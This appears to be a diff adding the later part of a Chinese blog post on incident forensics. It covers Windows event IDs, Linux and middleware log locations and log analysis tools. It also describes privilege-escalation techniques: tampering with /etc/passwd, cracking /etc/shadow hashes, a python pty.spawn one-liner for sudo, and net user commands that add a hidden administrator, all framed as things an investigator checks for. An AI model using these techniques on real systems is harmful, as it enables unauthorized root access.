+<li><p><strong>明文root密码权限</strong><br>大多数linux系统的密码都和/etc/passwd和/etc/shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。<br>__passwd文件__内的内容格式如下：root:x:0:0:root:/root:/bin/bash，其含义分别为用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell。其中第二个标签口令要说一点，真正的加密后的用户口令字存放到 /etc/shadow 文件中，而在 /etc/passwd 文件的口令字段中只存放一个特殊的字符，例如“x”或者星号。如果passwd可写，我们就可以把root的密码字段(x)替换成一个已知密码的hash（比如本机shadow里面的root密码hash），这样系统在验证密码时以passwd的为准，密码就已知了。__shadow文件__同理，结构如下：用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段；如果shadow可读，我们可以读走root的hash，然后用hashcat或者john暴力破解之。由上，<strong>在溯源时，我们可以查看入侵者的是否读取过这两个文件，或对这两个文件进行更改。</strong></p>
+</li>
+<li><p><strong>密码</strong><br>很多管理员会使用弱密码或重复使用密码，因此数据库或者web后台的密码也许就是root密码。在溯源时，<strong>要确定密码是否为上述情况。</strong></p>
+</li>
+</ul>
+<h4 id="提高权限类"><a href="#提高权限类" class="headerlink" title="提高权限类"></a>提高权限类</h4><ul>
+<li><p>SUDO提权<br>有了（疑似）root密码一定会想ssh登陆。然而ssh很可能禁止root登陆，或是防火墙规则将你排除在外了。返回来想，我们不是有一个低权shell了吗？找个办法再上面“输入”密码就好了。显然，直接在低权shell里面用sudo是不奏效的。这是因为出于安全考虑，linux要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）。换句话说，sudo在你输入密码的时候本质上是读取了键盘，而不是bash里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。python就有这样的功能。在shell里面输入：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p>之后输入密码就可以了。</p>
+</li>
+<li><p>计划任务<br>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br></pre></td></tr></table></figure>
+<h3 id="Windows常见漏洞"><a href="#Windows常见漏洞" class="headerlink" title="Windows常见漏洞"></a>Windows常见漏洞</h3></li>
+</ul>
+<h3 id="Web服务常见漏洞"><a href="#Web服务常见漏洞" class="headerlink" title="Web服务常见漏洞"></a>Web服务常见漏洞</h3><h3 id="第三方软件常见漏洞"><a href="#第三方软件常见漏洞" class="headerlink" title="第三方软件常见漏洞"></a>第三方软件常见漏洞</h3><h2 id="常见系统、软件日志默认存放位置"><a href="#常见系统、软件日志默认存放位置" class="headerlink" title="常见系统、软件日志默认存放位置"></a>常见系统、软件日志默认存放位置</h2><h3 id="Windows日志"><a href="#Windows日志" class="headerlink" title="Windows日志"></a>Windows日志</h3><pre><code>常见事件ID：
+4624  --登录成功   
+4625  --登录失败  
+4634 -- 注销成功
+4647 -- 用户启动的注销   
+4672 -- 使用超级用户（如管理员）进行登录
+4688 -- 进程创建
+4689 -- 进程终止
+4728、4732 -- 安全组管理
+4720、4722、4724、4738 -- 用户账户管理</code></pre>
+<ol>
+<li>Win+X菜单直接选择事件查看器 或者 Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”</li>
+<li>使用mstsc远程登录某个主机时，使用的帐户是管理员帐户的话，成功的情况下会有ID为4776、4648、4624、4672的事件产生</li>
+<li>Win+R打开运行，输入“CMD”，回车运行“ipconfig”，会报事件ID4688、4689产生的日志过程是这个样子：<br> 进程创建 C:\Windows\System32\cmd.exe<br> 进程创建 C:\Windows\System32\ipconfig.exe<br> 进程终止 C:\Windows\System32\ipconfig.exe </li>
+<li>在入侵提权过程中，如果输入<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user  USER  PASSWORD /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators USER /add</span><br></pre></td></tr></table></figure>
+会报4728、4722、4738、4724、4732</li>
+</ol>
+<h3 id="Linux日志"><a href="#Linux日志" class="headerlink" title="Linux日志"></a>Linux日志</h3><p>大部分Linux发行版默认的日志守护进程为 syslog，位于 /etc/syslog 或 /etc/syslogd 或/etc/rsyslog.d，默认配置文件为 /etc/syslog.conf 或 rsyslog.conf，任何希望生成日志的程序都可以向 syslog 发送信息。<br>常用日志文件<br>系统日志是由一个名为syslog的服务管理的，如以下日志文件都是由syslog日志服务驱动的：</p>
+<ul>
+<li>/var/log/boot.log：录了系统在引导过程中发生的事件，就是Linux系统开机自检过程显示的信息</li>
+<li>/var/log/lastlog ：记录最后一次用户成功登陆的时间、登陆IP等信息</li>
+<li>/var/log/messages ：记录Linux操作系统常见的系统和服务错误信息</li>
+<li>/var/log/secure ：Linux系统安全日志，记录用户和工作组变坏情况、用户登陆认证情况</li>
+<li>/var/log/btmp ：记录Linux登陆失败的用户、时间以及远程IP地址</li>
+<li>/var/log/syslog：只记录警告信息，常常是系统出问题的信息，使用lastlog查看</li>
+<li>/var/log/wtmp：该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件，使用last命令查看</li>
+<li>/var/run/utmp：该日志文件记录有关当前登录的每个用户的信息。如 who、w、users、finger等就需要访问这个文件</li>
+</ul>
+<h3 id="中间件日志"><a href="#中间件日志" class="headerlink" title="中间件日志"></a>中间件日志</h3><ul>
+<li>Apache的日志路径一般配置在httpd.conf的目录下或者位于/var/log/http</li>
+<li>IIS的日志默认在系统目录下的Logfiles下的目录当中</li>
+<li>Tomcat 一般位于tomcat安装目录下的一个logs文件夹下面</li>
+<li>Nginx日志一般配置在nginx.conf或者vhost的conf文件中</li>
+</ul>
+<h2 id="推荐日志分析工具"><a href="#推荐日志分析工具" class="headerlink" title="推荐日志分析工具"></a>推荐日志分析工具</h2><ol>
+<li>windows系统的日志分析工具，Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。<br>Log <a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Parser 2.2下载</a></li>
+</ol>
+<ol start="2">
+<li>设备日志分析工具，<a target="_blank" rel="noopener" href="https://github.com/JeffXue/web-log-parser">web-log-parse</a></li>
+</ol>
+<ul>
+<li> 将日志文件存放到./data目录下</li>
+<li> 更改配置文件config.ini</li>
+<li> 下载依赖库 pip install -r requirements.txt</li>
+<li> 开始分析 ./bin &amp;&amp; python start.py</li>
+<li> 结果将存储在 ./result/index.html</li>
+</ul>
+<h2 id="社工的艺术"><a href="#社工的艺术" class="headerlink" title="社工的艺术"></a>社工的艺术</h2><p>P.S. 推荐《社工的艺术》，见附件“社工-欺骗的艺术.pdf”</p>
+
+      
+    </div>
+    
+    
+    
+  </div>
+</article>
+
+
+
+  
+
+
+
+
+    </div>
+  </div>
+  
+
+
+
+
+<div id="settings-container">
+  <div id="dark-mode">dark</div>
+  <div id="sans-font">sans</div>
+</div>
+<script type="text/javascript">
+let d=document,r=d.documentElement.style,f=r.setProperty.bind(r),l=localStorage,s=l.getItem('s')||(window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches),n=l.getItem('n'),m=d.getElementById("dark-mode"),b=()=>{f('--bg-color','#fafafa');f('--code-bg-color','#f4f4f4');f('--text-color','#212121');f('--secondary-color','#808080');f('--tertiary-color','#b0b0b0');f('--link-color','#b5c8cf');f('--link-hover-color','#618794');f('--link-bg-color','#dae4e7');f('--selection-color','#dae4e7');m.innerHTML="dark"},c=()=>{f('--bg-color','#212121');f('--code-bg-color','#292929');f('--text-color','#fff');f('--secondary-color','#c0c0c0');f('--tertiary-color','#6e6e6e');f('--link-color','#4d6b75');f('--link-hover-color','#96b1bb');f('--link-bg-color','#5d828e');f('--selection-color','#acc1c9');m.innerHTML="light"},o=d.getElementById("sans-font"),e=()=>{f('--body-stack','"Lora", "Georgia", "Times New Roman", serif');o.innerHTML="sans"},g=()=>{f('--body-stack','"Lato", "Lucida Grande", "Lucida Sans Unicode", "Lucida Sans", "Verdana", sans-serif');o.innerHTML="serif"};m.onclick=()=>{if(s==2){s=1;l.setItem('s',s);c()}else{s=2;l.setItem('s',s);b()}};o.onclick=()=>{if(n==2){n=1;l.setItem('n',n);g()}else{n=2;l.setItem('n',n);e()}};if(!s){s=2;l.setItem('s',2)};if(s==1){c()};if(!n){n=2;l.setItem('n',2)};if(n==1){g()};
+</script>
+
+
+
+
+</body>
+</html>
